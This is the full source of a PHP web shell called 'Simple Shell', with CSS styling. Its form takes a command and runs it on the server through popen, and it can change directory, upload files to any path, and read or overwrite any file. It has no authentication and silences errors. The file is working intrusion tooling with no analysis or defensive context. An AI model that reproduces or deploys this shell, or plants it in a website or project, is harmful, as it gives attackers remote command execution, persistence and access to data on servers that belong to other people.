<style>
@import url('https://fonts.googleapis.com/css2?family=Ubuntu&display=swap');
body,input {
font-family: 'Ubuntu', sans-serif;
}
table {
width:70%;
background: #fff;
padding:15px;
border-radius:10px;
box-shadow: 0 10px 20px rgba(0,0,0,0.19), 0 6px 6px rgba(0,0,0,0.23);
}
table td {
padding:5px;
}
div.label {
font-size:20px;
padding-left:5px;
padding-top:5px;
padding-bottom:5px;
}
div.input input[type=text] {
width:100%;
padding:8px;
border-radius:8px;
border: 1px solid #ebebeb;
background: #ebebeb;
outline: none;
}
div.submit {
padding-top:10px;
padding-bottom: 10px;
}
div.submit input[type=submit] {
width:100%;
padding:8px;
border-radius:8px;
background: #e7f3ff;
outline: none;
border: 1px solid #e7f3ff;
color: #1889f5;
font-weight: bold;
}
input[type=submit] {
width:100%;
padding:8px;
border-radius:8px;
background: #e7f3ff;
outline: none;
border: 1px solid #e7f3ff;
color: #1889f5;
font-weight: bold;
}
select {
width:100%;
padding:8px;
border-radius:8px;
border: 1px solid #ebebeb;
background: #ebebeb;
outline: none;
}
input[type=submit]:hover {
cursor: pointer;
}
div.submit input[type=submit]:hover {
cursor: pointer;
}
div.textarea textarea {
width:100%;
height:380px;
resize: none;
border-radius:8px;
outline: none;
border: 1px solid #ebebeb;
background: #ebebeb;
padding:20px;
}
</style>
<?php
error_reporting(0);
if($_POST['dir']=="")
	{
		$curdir=`pwd`;
	}
	else
		{
			$curdir=$_POST['dir'];
		}
if($_POST['king']=="")
	{
		$curcmd="ls -lah";
	}
	else
		{
			$curcmd=$_POST['king'];
		}
?>
<table align="center">
	<tr>
		<th colspan="3">
			<h1>Simple Shell</h1>
		</th>
	</tr>
	<?php
	if (isset($_POST['edit']))
		{
			?>
			<tr>
				<td>
					Filename
				</td>
				<td>:</td>
				<td><?= $_POST['file'] ?></td>
			</tr>
			<?php
			if (isset($_POST['submit'])) {
				$handle = fopen($_POST['file'], 'w');
				if (fwrite($handle, $_POST['data'])) {
					?> <tr><td>Success</td></tr> <?php
				} else {
					?> <tr><td>Failed</td></tr> <?php
				}
			}
			?>
			<form method="post">
				<tr>
					<td colspan="3">
						<div class="textarea">
							<textarea style="height:500px;" name="data"><?= htmlspecialchars(file_get_contents($_POST['file'])) ?></textarea>
						</div>
					</td>
				</tr>
				<tr>
					<td colspan="3">
						<input type="submit" name="submit" value="Update">
						<input type="hidden" name="file" value="<?= $_POST['file'] ?>">
						<input type="hidden" name="edit" style="width: 100%;">
					</td>
				</tr>
			</form>
			<?php
			exit();
		}
	?>
	<form method="post" enctype="multipart/form-data">
		<tr>
			<td colspan="2">
				<div class="label">
					<span>Execute command</span>
				</div>
				<div class="input">
					<input name="king" type="text" value="<?php echo $curcmd;?>">
				</div>
			</td>
		</tr>
		<tr>
			<td colspan="2">
				<div class="label">
					<span>Change directory</span>
				</div>
				<div class="input">
					<input name="dir" type="text" value="<?php echo $curdir;?>">
				</div>
			</td>
		</tr>
		<tr>
			<td colspan="2">
				<div class="submit">
					<input name="exe" type="submit" value="Execute">
				</div>
			</td>
		</tr>
		
			<tr>
				<td>
					<div class="label">
						<span>Upload File</span>
					</div>
				</td>
			</tr>
			<tr>
				<td>
					<input name="fila" type="file" size="90">
				</td>
				<td>
					<input style="width:100%;" name="upl" type="submit" value="Upload">
				</td>
			</tr>
		</form>
		<?php 
		if(($_POST['upl'])=="Upload" ) 
			{
				if(move_uploaded_file($_FILES['fila']['tmp_name'],$curdir."/".$_FILES['fila']['name']))
					{
						echo "The file has been uploaded<br><br>";
					}
					else
						{
							echo "There was an error uploading the file, please try again!";
						}
					}
		?>
		<tr>
			<td>
				<div class="label">
					<span>Edit File</span>
				</div>
			</td>
		</tr>
		<form method="post">
			<tr>
				<td>
					<select name="file">
						<option disabled selected>Select File</option>
						<?php
						foreach (scandir($curdir) as $key => $value) {
							$file = $curdir . DIRECTORY_SEPARATOR . $value;
							if (is_file($file)) {
								?> <option value="<?= $file ?>"><u><?= $value ?></u></option> <?php
							}
						}
						if (!count($curdir)) {
							?> <option disabled>no files in this directory</option> <?php
						}
						?>
					</select>
				</td>
				<td>
					<input style="width:100%;" type="submit" name="edit" value="Edit">
				</td>
			</tr>
		</form>
		</tr>
		<tr>
			<td colspan="2">
				<div class="textarea">
					<pre>
					<?php 
					if(($_POST['exe'])=="Execute")
						{$curcmd="cd ".$curdir.";".$curcmd;
						$f=popen($curcmd,"r");
						while(!feof($f)){
							$buffer=fgets($f,4096);$string.=$buffer;
						}
						pclose($f);
							echo htmlspecialchars($string);
						}
						?>
					</pre>
				</div>
			</td>
		</tr>
	</table>
